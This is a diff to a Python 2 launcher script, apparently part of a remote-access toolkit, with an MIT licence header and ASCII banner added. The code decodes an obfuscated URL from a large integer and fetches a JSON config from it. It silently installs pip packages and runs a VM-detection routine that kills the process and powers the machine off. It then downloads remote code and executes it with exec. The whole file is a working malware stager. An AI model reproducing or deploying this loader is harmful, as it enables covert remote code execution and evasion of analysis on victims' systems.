@@ -1,3 +1,52 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+#
+# Copyright (c) 2017 colental
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in all
+# copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
+
+"""
+ 
+ 
+        ,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,   aa       aa
+        ""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a  88       88
+        ,adPPPPP88 88       88 8b       88 88	        8b       88
+        88,    ,88 88       88 "8a,   ,d88 88	        "8a,   ,d88
+        `"8bbdP"Y8 88       88  `"YbbdP"Y8 88            `"YbbdP"Y8
+                                aa,    ,88 	         aa,    ,88
+                                 "Y8bbdP"                 "Y8bbdP'
+
+                                                       88                          ,d
+                                                       88                          88
+         ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
+        a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
+        8PP8888888 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
+        "8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
+         `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
+                    aa,    ,88  aa,    ,88 88                                      "Y888
+                     "Y8bbdP"    "Y8bbdP"  88
+
+
+
+                            https://github.com/colental/ae
+"""
+
 from __future__ import print_function
 import os
 import sys
@@ -37,10 +86,9 @@ def main(*args, **kwargs):
         IncontinentObtuseCucumber = lambda x: long(bytes(x).encode('hex'), 16)
         SomberUnbecomingAmusement = lambda x: bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))
         RuthlessSpiffyTablecloth  = lambda x: os.popen(' '.join([i for i in x])).read().rstrip() if type(x) is list else os.popen(x).read().rstrip()
-        SeamlessGalacticSponges   = lambda x: print(str(x)) if _debug else ''
         AccidentalAquaticCat      = json.loads(urllib.urlopen(SomberUnbecomingAmusement(kwargs.get('config'))).read())
         AccidentalAquaticCat['f'] = bytes(IncontinentObtuseCucumber(__file__))
-        GroovySophisticatedLemur  = os.popen('where pip').read().rstrip() if os.name is 'nt' else os.popen('which pip').read().rstrip()
+        GroovySophisticatedLemur  = os.popen('where pip' if os.name is 'nt' else 'which pip').read().rstrip()
         if not len(GroovySophisticatedLemur):
             if os.name is 'nt':
                 if os.path.exists('/Python27/Scripts/pip.exe'):
@@ -87,13 +135,10 @@ def main(*args, **kwargs):
                                     RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', ZonkedEnthusiasticTadpole])
                                     if os.path.isfile(ZonkedEnthusiasticTadpole):
                                         os.remove(ZonkedEnthusiasticTadpole)
-                                else:
-                                    SeamlessGalacticSponges('{"{}": "{}"} was not loaded'.format(ZonkedEnthusiasticTadpole, NobleRusticWalrus))
             except Exception as e:
                 if _debug:
                     print("Launch error: {}".format(str(e)))
             finally:
-                AccidentalAquaticCat['v'] = '00000000000000000000'
                 return AccidentalAquaticCat                
     
     if kwargs.get('checkvm'):
@@ -108,7 +153,7 @@ def main(*args, **kwargs):
                     _ = os.popen('kill -9 %d' % os.getpid()).read()
                     _ = os.popen('shutdown --poweroff --no-wall').read()
 
-    if 'config' in kwargs:
+    if kwargs.get('config'):
         AccidentalAquaticCat        = CrystallineSluggishAnatomy(**kwargs)
         SomberUnbecomingAmusement   = lambda x: bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241%s' % x)).strip('0x').strip('L')))
         pkgs     = 'from __future__ import print_function\n'
@@ -125,16 +170,15 @@ def main(*args, **kwargs):
             head = head + "\n\nif __name__ == '__main__':\n\tmain(**{})".format(json.dumps(AccidentalAquaticCat))
             body = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read()
             pkgs = pkgs + urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('w'))).read()
-        exec('\n\n\n'.join(pkgs, body, head)) in globals()
+        payload  = '\n\n\n'.join([pkgs, body, head])
+        exec(payload) in globals()
 
 
 if __name__ == '__main__':
-    if len(sys.argv) > 1:
-        if '--debug' in sys.argv:
-            _debug = True
-        else:
-            _debug = False
-        main(config=81126388790932157784)
+    if '--debug' in sys.argv:
+        _debug = True
+    else:
+        _debug = False
+    main(config=81126388790932157784)
 
-
-            
+     
